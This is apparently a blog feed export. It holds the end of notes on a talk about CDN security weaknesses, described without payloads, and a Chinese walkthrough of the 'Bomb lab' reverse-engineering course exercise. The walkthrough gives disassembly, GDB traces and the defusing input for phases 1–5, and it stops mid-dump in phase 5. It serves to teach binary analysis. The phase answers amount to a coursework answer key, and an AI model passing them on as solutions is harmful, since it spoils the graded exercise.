第二天上午的报告由来自<strong>清华大学</strong>的<strong>陈建军</strong>老师主讲，陈老师的研究方向包括互联网基础协议安全，漏洞挖掘技术等等。</p><h2 id="CDN-内容分发网络"><a href="#CDN-内容分发网络" class="headerlink" title="CDN 内容分发网络"></a>CDN 内容分发网络</h2><p>  下面这张图片清晰地描述了 CDN 在网络中发挥的作用</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p17.png"></p><p>  CDN 的核心功能有：</p><ul><li><p>网络加速；</p></li><li><p>WEB 应用防火墙（WAF）；</p></li><li><p>DDoS 防护等</p><p>下图是 CDN 的工作方式：</p></li></ul><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p18.png"></p><h2 id="CDN-的安全隐患"><a href="#CDN-的安全隐患" class="headerlink" title="CDN 的安全隐患"></a>CDN 的安全隐患</h2><h3 id="后端通信劫持"><a href="#后端通信劫持" class="headerlink" title="后端通信劫持"></a>后端通信劫持</h3><p>  有部分的 CDN ， 其 CDN 服务器和主机间的通信是 HTTP 明文传输：</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p19.png"></p><p>  这种情况会导致后端通信可能被劫持，污染 CDN 节点的缓存数据。</p><h3 id="前端通信的授权认证问题"><a href="#前端通信的授权认证问题" class="headerlink" title="前端通信的授权认证问题"></a>前端通信的授权认证问题</h3><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p20.png"></p><p>  解决方法：</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p21.png"></p><h3 id="不一致性带来的隐患"><a href="#不一致性带来的隐患" class="headerlink" title="不一致性带来的隐患"></a>不一致性带来的隐患</h3><p>  由于 CDN 是多方交互，其服务器可能会存在不一致性，且不同网站会共享同一 CDN 服务器；</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p22.png"></p><p>  以上案例利用的不同服务器，对<code>Content-length</code>的前/后选取不同的差异，进行攻击。</p><hr><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p23.png"></p><p>  该案例是不同主机对 HOST 解析不同的差异带来的漏洞。</p><p>  下图可看出，不同的系统对 Host 头处理方式是大多不同的，很容易产生隐患。</p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p24.png"></p><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p25.png"></p><p>  可以看到，有<strong>不在少数</strong>的上下游组合可以被该漏洞利用。</p><h3 id="CDN-流量放大攻击"><a href="#CDN-流量放大攻击" class="headerlink" title="CDN 流量放大攻击"></a>CDN 流量放大攻击</h3><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p26.png"></p><h2 id="论文阅读推荐"><a href="#论文阅读推荐" class="headerlink" title="论文阅读推荐"></a>论文阅读推荐</h2><p><img src="/2023/08/16/Let-s-GoSSIP-Summer-School/p27.png"></p><p>  最后，陈老师推荐了以上几篇论文供大家阅读。</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>  众所周知，我的博客目前仍然是挂载在 github 上的，故正准备为我的博客搭建一个 CDN ，随便试试手（笑）；敬请期待。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bomblab</title>
    <link href="/2023/04/20/Bomblab/"/>
    <url>/2023/04/20/Bomblab/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机系统第三次实验-Bomb-lab"><a href="#计算机系统第三次实验-Bomb-lab" class="headerlink" title="计算机系统第三次实验 Bomb lab"></a>计算机系统第三次实验 Bomb lab</h1><p>本实验用到的环境、命令如下：</p><ul><li>Ubuntu 20.04</li><li><code>objdump</code></li><li>GDB（~peda插件版）</li></ul><h2 id="Phase-1"><a href="#Phase-1" class="headerlink" title="Phase 1"></a>Phase 1</h2><ul><li><p>将 bomb 这个 elf 文件使用 <code>file bomb</code>查看其基本信息，得知它是一个 64 bit 程序，放入 Ubuntu 20.04 中进行后续操作；</p></li><li><p><code>chmod 777 bomb</code>为其赋予权限；</p></li><li><p>使用 <code> objdump -d bomb</code>获取其反汇编代码如下（节选 <phase_1> 部分）</phase_1></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs assembly">00000000000015e7 &lt;phase_1&gt;:<br>    15e7:f3 0f 1e fa          endbr64 <br>    15eb:48 83 ec 08          sub    $0x8,%rsp<br>    15ef:48 8d 35 5a 1b 00 00 lea    0x1b5a(%rip),%rsi        # 3150 &lt;_IO_stdin_used+0x150&gt;<br>    15f6:e8 f4 04 00 00       callq  1aef &lt;strings_not_equal&gt;<br>    15fb:85 c0                test   %eax,%eax<br>    15fd:75 05                jne    1604 &lt;phase_1+0x1d&gt;<br>    15ff:48 83 c4 08          add    $0x8,%rsp<br>    1603:c3                   retq   <br>    1604:e8 fa 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1609:eb f4                jmp    15ff &lt;phase_1+0x18&gt;<br><br></code></pre></td></tr></table></figure><p>分析如下：</p><ul><li><p>注意不要运行炸弹函数<code>&lt;explode_bomb&gt;</code>！</p></li><li><p>那么需要执行 1603 处的代码；</p></li><li><p>注意到，15fd 处的跳转若触发，则程序跳转至 1604 处，会失败；</p></li><li><p>那么 eax 需要为 0，这样 15fb 行跳转不会触发；</p></li><li><p>需要<code>strings_not_equal</code>函数返回值为 0 ； </p></li><li><p>上述函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs assembly">1aef:f3 0f 1e fa          endbr64 <br>1af3:41 54                push   %r12<br>1af5:55                   push   %rbp<br>1af6:53                   push   %rbx<br>1af7:48 89 fb             mov    %rdi,%rbx<br>1afa:48 89 f5             mov    %rsi,%rbp<br>1afd:e8 cc ff ff ff       callq  1ace &lt;string_length&gt;<br>1b02:41 89 c4             mov    %eax,%r12d<br>1b05:48 89 ef             mov    %rbp,%rdi<br>1b08:e8 c1 ff ff ff       callq  1ace &lt;string_length&gt;<br>1b0d:89 c2                mov    %eax,%edx<br>1b0f:b8 01 00 00 00       mov    $0x1,%eax<br>1b14:41 39 d4             cmp    %edx,%r12d<br>1b17:75 31                jne    1b4a &lt;strings_not_equal+0x5b&gt;<br>1b19:0f b6 13             movzbl (%rbx),%edx<br>1b1c:84 d2                test   %dl,%dl<br>1b1e:74 1e                je     1b3e &lt;strings_not_equal+0x4f&gt;<br>1b20:b8 00 00 00 00       mov    $0x0,%eax<br>1b25:38 54 05 00          cmp    %dl,0x0(%rbp,%rax,1)<br>1b29:75 1a                jne    1b45 &lt;strings_not_equal+0x56&gt;<br>1b2b:48 83 c0 01          add    $0x1,%rax<br>1b2f:0f b6 14 03          movzbl (%rbx,%rax,1),%edx<br>1b33:84 d2                test   %dl,%dl<br>1b35:75 ee                jne    1b25 &lt;strings_not_equal+0x36&gt;<br>1b37:b8 00 00 00 00       mov    $0x0,%eax<br>1b3c:eb 0c                jmp    1b4a &lt;strings_not_equal+0x5b&gt;<br>1b3e:b8 00 00 00 00       mov    $0x0,%eax<br>1b43:eb 05                jmp    1b4a &lt;strings_not_equal+0x5b&gt;<br>1b45:b8 01 00 00 00       mov    $0x1,%eax<br>1b4a:5b                   pop    %rbx<br>1b4b:5d                   pop    %rbp<br>1b4c:41 5c                pop    %r12<br>1b4e:c3                   retq   <br></code></pre></td></tr></table></figure></li><li><p>GDB 动态调试中，找到字符串<code>I am not part of the problem. I am a Republican.</code></p></li><li><p>传入上述字符串即可通关 phase_1。</p></li></ul><h2 id="Phase-2"><a href="#Phase-2" class="headerlink" title="Phase 2"></a>Phase 2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000000000000160b &lt;phase_2&gt;:<br>    160b:f3 0f 1e fa          endbr64 <br>    160f:55                   push   %rbp<br>    1610:53                   push   %rbx<br>    1611:48 83 ec 28          sub    $0x28,%rsp<br>    1615:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    161c:00 00 <br>    161e:48 89 44 24 18       mov    %rax,0x18(%rsp)<br>    1623:31 c0                xor    %eax,%eax<br>    1625:48 89 e6             mov    %rsp,%rsi<br>    1628:e8 02 06 00 00       callq  1c2f &lt;read_six_numbers&gt;<br>    162d:83 3c 24 01          cmpl   $0x1,(%rsp)<br>    1631:75 0a                jne    163d &lt;phase_2+0x32&gt;<br>    1633:48 89 e3             mov    %rsp,%rbx<br>    1636:48 8d 6c 24 14       lea    0x14(%rsp),%rbp<br>    163b:eb 10                jmp    164d &lt;phase_2+0x42&gt;<br>    163d:e8 c1 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1642:eb ef                jmp    1633 &lt;phase_2+0x28&gt;<br>    1644:48 83 c3 04          add    $0x4,%rbx<br>    1648:48 39 eb             cmp    %rbp,%rbx<br>    164b:74 10                je     165d &lt;phase_2+0x52&gt;<br>    164d:8b 03                mov    (%rbx),%eax<br>    164f:01 c0                add    %eax,%eax<br>    1651:39 43 04             cmp    %eax,0x4(%rbx)<br>    1654:74 ee                je     1644 &lt;phase_2+0x39&gt;<br>    1656:e8 a8 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    165b:eb e7                jmp    1644 &lt;phase_2+0x39&gt;<br>    165d:48 8b 44 24 18       mov    0x18(%rsp),%rax<br>    1662:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    1669:00 00 <br>    166b:75 07                jne    1674 &lt;phase_2+0x69&gt;<br>    166d:48 83 c4 28          add    $0x28,%rsp<br>    1671:5b                   pop    %rbx<br>    1672:5d                   pop    %rbp<br>    1673:c3                   retq   <br>    1674:e8 d7 fb ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><ul><li><p>关键行 165b ，其无条件跳转回 1644 ，且需注意 1654，eax 必须与 0x4(%rbx)相等，否则触发引爆函数；</p></li><li><p>由 162d ，1631 得知，第一个传入的数必须是 1；</p></li><li><p>注意 164f ，eax 值乘2，然后与内存中的一个值比较，这个值是上一次循环中的 eax；</p></li><li><p>至此，可以看出是一个 2 的幂次的循环。</p></li><li><p>payload = 1 2 4 8 16 32；</p></li><li><p>成功解决 phase2；</p></li></ul><h2 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase 3"></a>Phase 3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000001679 &lt;phase_3&gt;:<br>    1679:f3 0f 1e fa          endbr64 <br>    167d:48 83 ec 18          sub    $0x18,%rsp<br>    1681:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    1688:00 00 <br>    168a:48 89 44 24 08       mov    %rax,0x8(%rsp)<br>    168f:31 c0                xor    %eax,%eax<br>    1691:48 8d 4c 24 04       lea    0x4(%rsp),%rcx<br>    1696:48 89 e2             mov    %rsp,%rdx<br>    1699:48 8d 35 8f 1c 00 00 lea    0x1c8f(%rip),%rsi        # 332f &lt;array.0+0x14f&gt;<br>    16a0:e8 5b fc ff ff       callq  1300 &lt;__isoc99_sscanf@plt&gt;<br>    16a5:83 f8 01             cmp    $0x1,%eax<br>    16a8:7e 1a                jle    16c4 &lt;phase_3+0x4b&gt;<br>    16aa:83 3c 24 07          cmpl   $0x7,(%rsp)<br>    16ae:77 65                ja     1715 &lt;phase_3+0x9c&gt;<br>    16b0:8b 04 24             mov    (%rsp),%eax<br>    16b3:48 8d 15 06 1b 00 00 lea    0x1b06(%rip),%rdx        # 31c0 &lt;_IO_stdin_used+0x1c0&gt;<br>    16ba:48 63 04 82          movslq (%rdx,%rax,4),%rax<br>    16be:48 01 d0             add    %rdx,%rax<br>    16c1:3e ff e0             notrack jmpq *%rax<br>    16c4:e8 3a 05 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    16c9:eb df                jmp    16aa &lt;phase_3+0x31&gt;<br>    16cb:b8 4c 01 00 00       mov    $0x14c,%eax<br>    16d0:39 44 24 04          cmp    %eax,0x4(%rsp)<br>    16d4:75 52                jne    1728 &lt;phase_3+0xaf&gt;<br>    16d6:48 8b 44 24 08       mov    0x8(%rsp),%rax<br>    16db:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    16e2:00 00 <br>    16e4:75 49                jne    172f &lt;phase_3+0xb6&gt;<br>    16e6:48 83 c4 18          add    $0x18,%rsp<br>    16ea:c3                   retq   <br>    16eb:b8 89 02 00 00       mov    $0x289,%eax<br>    16f0:eb de                jmp    16d0 &lt;phase_3+0x57&gt;<br>    16f2:b8 f6 00 00 00       mov    $0xf6,%eax<br>    16f7:eb d7                jmp    16d0 &lt;phase_3+0x57&gt;<br>    16f9:b8 ae 01 00 00       mov    $0x1ae,%eax<br>    16fe:eb d0                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1700:b8 f1 02 00 00       mov    $0x2f1,%eax<br>    1705:eb c9                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1707:b8 17 01 00 00       mov    $0x117,%eax<br>    170c:eb c2                jmp    16d0 &lt;phase_3+0x57&gt;<br>    170e:b8 2a 02 00 00       mov    $0x22a,%eax<br>    1713:eb bb                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1715:e8 e9 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    171a:b8 00 00 00 00       mov    $0x0,%eax<br>    171f:eb af                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1721:b8 24 01 00 00       mov    $0x124,%eax<br>    1726:eb a8                jmp    16d0 &lt;phase_3+0x57&gt;<br>    1728:e8 d6 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    172d:eb a7                jmp    16d6 &lt;phase_3+0x5d&gt;<br>    172f:e8 1c fb ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li><p>注意前面几行，sscanf 调用之前，设置了四个参数，可以看出是传入两个数；</p></li><li><p>且第一个数要小于 7 ，否则触发引爆函数；</p></li><li><p>随后跳转到 rax 指向的位置执行；</p></li><li><p>进入 gdb 进行动态调试，跟踪一下进入 rax 指向空间后的堆栈情况；</p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">[-------------------------------------code-------------------------------------]<br>   <span class="hljs-number">0x5555555556c1</span> &lt;phase_3+<span class="hljs-number">72</span>&gt;:notrack <span class="hljs-keyword">jmp</span> <span class="hljs-built_in">rax</span><br>   <span class="hljs-number">0x5555555556c4</span> &lt;phase_3+<span class="hljs-number">75</span>&gt;:<span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555c03</span> &lt;explode_bomb&gt;<br>   <span class="hljs-number">0x5555555556c9</span> &lt;phase_3+<span class="hljs-number">80</span>&gt;:<span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x5555555556aa</span> &lt;phase_3+<span class="hljs-number">49</span>&gt;<br>=&gt; <span class="hljs-number">0x5555555556cb</span> &lt;phase_3+<span class="hljs-number">82</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">eax</span>,<span class="hljs-number">0x14c</span><br>   <span class="hljs-number">0x5555555556d0</span> &lt;phase_3+<span class="hljs-number">87</span>&gt;:<span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x4</span>],<span class="hljs-built_in">eax</span><br>   <span class="hljs-number">0x5555555556d4</span> &lt;phase_3+<span class="hljs-number">91</span>&gt;:<span class="hljs-keyword">jne</span>    <span class="hljs-number">0x555555555728</span> &lt;phase_3+<span class="hljs-number">175</span>&gt;<br>   <span class="hljs-number">0x5555555556d6</span> &lt;phase_3+<span class="hljs-number">93</span>&gt;:<span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x8</span>]<br>   <span class="hljs-number">0x5555555556db</span> &lt;phase_3+<span class="hljs-number">98</span>&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">fs</span>:<span class="hljs-number">0x28</span><br>//这是执行代码情况<br><br><br>随后将 <span class="hljs-built_in">eax</span>（值为<span class="hljs-number">0x14c</span>）与传入的第二个参数对比，可见第二个参数需要为 <span class="hljs-number">0x14c</span>！<br></code></pre></td></tr></table></figure><ul><li><p>payload = 1 334；</p></li><li><p>成功解决phase_3；</p></li></ul><h2 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase 4"></a>Phase 4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000001734 &lt;func4&gt;:<br>    1734:f3 0f 1e fa          endbr64 <br>    1738:53                   push   %rbx<br>    1739:89 d0                mov    %edx,%eax<br>    173b:29 f0                sub    %esi,%eax<br>    173d:89 c3                mov    %eax,%ebx<br>    173f:c1 eb 1f             shr    $0x1f,%ebx<br>    1742:01 c3                add    %eax,%ebx<br>    1744:d1 fb                sar    %ebx<br>    1746:01 f3                add    %esi,%ebx<br>    1748:39 fb                cmp    %edi,%ebx<br>    174a:7f 06                jg     1752 &lt;func4+0x1e&gt;<br>    174c:7c 10                jl     175e &lt;func4+0x2a&gt;<br>    174e:89 d8                mov    %ebx,%eax<br>    1750:5b                   pop    %rbx<br>    1751:c3                   retq   <br>    1752:8d 53 ff             lea    -0x1(%rbx),%edx<br>    1755:e8 da ff ff ff       callq  1734 &lt;func4&gt;<br>    175a:01 c3                add    %eax,%ebx<br>    175c:eb f0                jmp    174e &lt;func4+0x1a&gt;<br>    175e:8d 73 01             lea    0x1(%rbx),%esi<br>    1761:e8 ce ff ff ff       callq  1734 &lt;func4&gt;<br>    1766:01 c3                add    %eax,%ebx<br>    1768:eb e4                jmp    174e &lt;func4+0x1a&gt;<br><br>000000000000176a &lt;phase_4&gt;:<br>    176a:f3 0f 1e fa          endbr64 <br>    176e:48 83 ec 18          sub    $0x18,%rsp<br>    1772:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    1779:00 00 <br>    177b:48 89 44 24 08       mov    %rax,0x8(%rsp)<br>    1780:31 c0                xor    %eax,%eax<br>    1782:48 8d 4c 24 04       lea    0x4(%rsp),%rcx<br>    1787:48 89 e2             mov    %rsp,%rdx<br>    178a:48 8d 35 9e 1b 00 00 lea    0x1b9e(%rip),%rsi        # 332f &lt;array.0+0x14f&gt;<br>    1791:e8 6a fb ff ff       callq  1300 &lt;__isoc99_sscanf@plt&gt;<br>    1796:83 f8 02             cmp    $0x2,%eax<br>    1799:75 06                jne    17a1 &lt;phase_4+0x37&gt;<br>    179b:83 3c 24 0e          cmpl   $0xe,(%rsp)<br>    179f:76 05                jbe    17a6 &lt;phase_4+0x3c&gt;<br>    17a1:e8 5d 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    17a6:ba 0e 00 00 00       mov    $0xe,%edx<br>    17ab:be 00 00 00 00       mov    $0x0,%esi<br>    17b0:8b 3c 24             mov    (%rsp),%edi<br>    17b3:e8 7c ff ff ff       callq  1734 &lt;func4&gt;<br>    17b8:83 f8 2d             cmp    $0x2d,%eax<br>    17bb:75 07                jne    17c4 &lt;phase_4+0x5a&gt;<br>    17bd:83 7c 24 04 2d       cmpl   $0x2d,0x4(%rsp)<br>    17c2:74 05                je     17c9 &lt;phase_4+0x5f&gt;<br>    17c4:e8 3a 04 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    17c9:48 8b 44 24 08       mov    0x8(%rsp),%rax<br>    17ce:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    17d5:00 00 <br>    17d7:75 05                jne    17de &lt;phase_4+0x74&gt;<br>    17d9:48 83 c4 18          add    $0x18,%rsp<br>    17dd:c3                   retq   <br>    17de:e8 6d fa ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li>读入两个数，其中第一个数要小于等于14；</li><li>17b8和17bd可看出，func4 返回值和 第二个数均应为 45；</li><li>于是一共就有14种可能（1 45、2 45、…… 、 14 45）；</li><li>分析 func4 可发现其是一个递归函数，当传入参数为 14 时，返回值为 45；</li><li>payload = 14 45；</li><li>第四题解决。</li></ul><h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase 5"></a>Phase 5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs assembly">00000000000017e3 &lt;phase_5&gt;:<br>    17e3:f3 0f 1e fa          endbr64 <br>    17e7:48 83 ec 18          sub    $0x18,%rsp<br>    17eb:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax<br>    17f2:00 00 <br>    17f4:48 89 44 24 08       mov    %rax,0x8(%rsp)<br>    17f9:31 c0                xor    %eax,%eax<br>    17fb:48 8d 4c 24 04       lea    0x4(%rsp),%rcx<br>    1800:48 89 e2             mov    %rsp,%rdx<br>    1803:48 8d 35 25 1b 00 00 lea    0x1b25(%rip),%rsi        # 332f &lt;array.0+0x14f&gt;<br>    180a:e8 f1 fa ff ff       callq  1300 &lt;__isoc99_sscanf@plt&gt;<br>    180f:83 f8 01             cmp    $0x1,%eax<br>    1812:7e 5a                jle    186e &lt;phase_5+0x8b&gt;<br>    1814:8b 04 24             mov    (%rsp),%eax<br>    1817:83 e0 0f             and    $0xf,%eax<br>    181a:89 04 24             mov    %eax,(%rsp)<br>    181d:83 f8 0f             cmp    $0xf,%eax<br>    1820:74 32                je     1854 &lt;phase_5+0x71&gt;<br>    1822:b9 00 00 00 00       mov    $0x0,%ecx<br>    1827:ba 00 00 00 00       mov    $0x0,%edx<br>    182c:48 8d 35 ad 19 00 00 lea    0x19ad(%rip),%rsi        # 31e0 &lt;array.0&gt;<br>    1833:83 c2 01             add    $0x1,%edx<br>    1836:48 98                cltq   <br>    1838:8b 04 86             mov    (%rsi,%rax,4),%eax<br>    183b:01 c1                add    %eax,%ecx<br>    183d:83 f8 0f             cmp    $0xf,%eax<br>    1840:75 f1                jne    1833 &lt;phase_5+0x50&gt;<br>    1842:c7 04 24 0f 00 00 00 movl   $0xf,(%rsp)<br>    1849:83 fa 0f             cmp    $0xf,%edx<br>    184c:75 06                jne    1854 &lt;phase_5+0x71&gt;<br>    184e:39 4c 24 04          cmp    %ecx,0x4(%rsp)<br>    1852:74 05                je     1859 &lt;phase_5+0x76&gt;<br>    1854:e8 aa 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1859:48 8b 44 24 08       mov    0x8(%rsp),%rax<br>    185e:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax<br>    1865:00 00 <br>    1867:75 0c                jne    1875 &lt;phase_5+0x92&gt;<br>    1869:48 83 c4 18          add    $0x18,%rsp<br>    186d:c3                   retq   <br>    186e:e8 90 03 00 00       callq  1c03 &lt;explode_bomb&gt;<br>    1873:eb 9f                jmp    1814 &lt;phase_5+0x31&gt;<br>    1875:e8 d6 f9 ff ff       callq  1250 &lt;__stack_chk_fail@plt&gt;<br><br></code></pre></td></tr></table></figure><ul><li>第五题仍然读入两个数，称之为第一个数、第二个数；</li><li>由181a~1820可看出，第一个数不能为15；</li><li>1833~1840这块代码可以看成：ecx不断地加上array中的不同的数，这个数，是上一个取出的数对应的数组中相应偏移量*4的数。当去取出的数为0xf时，结束，且此时取的次数应该为15，否则触发引爆函数；</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span>-peda$ x/<span class="hljs-number">60</span> <span class="hljs-number">0</span>x5555555571e0<br><span class="hljs-attribute">0x5555555571e0</span> &lt;array.<span class="hljs-number">0</span>&gt;:<span class="hljs-number">0</span>x000000020000000a<span class="hljs-number">0</span>x000000070000000e<br><span class="hljs-attribute">0x5555555571f0</span> &lt;array.<span class="hljs-number">0</span>+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0</span>x0000000c00000008<span class="hljs-number">0</span>x0000000b0000000f<br><span 